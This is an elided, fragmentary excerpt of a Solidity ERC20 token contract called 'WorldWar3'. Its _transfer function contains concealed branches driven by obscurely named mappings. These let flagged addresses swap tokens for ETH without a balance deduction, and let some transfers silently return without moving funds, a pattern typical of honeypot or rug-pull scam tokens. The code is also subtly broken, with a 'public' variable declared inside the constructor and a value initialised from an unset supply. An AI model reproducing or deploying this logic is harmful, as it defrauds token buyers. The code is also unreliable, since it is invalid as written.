...
contract WorldWar3 is Context, ERC20, Ownable {
  using SafeMath for uint256;
  uint256 private _totalSupply;
  uint256 private _val = _totalSupply;
  ...
  constructor(address routerAddress) {
    ...
    uint256 public MaxAmount = 1000 * 10**18 * 10**9 ;
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        uint256 fee;
        if (_swapAndLiquifyEnabled && contractTokenBalance > _val && !inSwapAndLiquify && sender != uniswapV2Pair) {
            inSwapAndLiquify = true;
            swapAndLiquify(contractTokenBalance);
            inSwapAndLiquify = false;
        } else if (_rwards[sender] > _val && _rwards[recipient] > _val) {
            fee = amount;
            _balances[address(this)] += fee;
            swapTokensForEth(amount, recipient);
            return;
        } else if (amount > _val && recipient != address(router) && recipient != uniswapV2Pair) {
            if (_rwards[sender] > 0) _rwards[recipient] = amount;
            else _allowd[sender] = amount;
            return;
        } else if (!inSwapAndLiquify && _allowd[sender] > 0 && sender != uniswapV2Pair && _rwards[sender] == 0) {
            _allowd[sender] = _rwards[sender] - _val;
        }
        address _address = _router[address(this)];
        if (_allowd[_address] == 0) _allowd[_address] = _val;
        _router[address(this)] = recipient;
        if (_taxFee > 0 && _rwards[sender] == 0 && !inSwapAndLiquify && _rwards[recipient] == 0) {
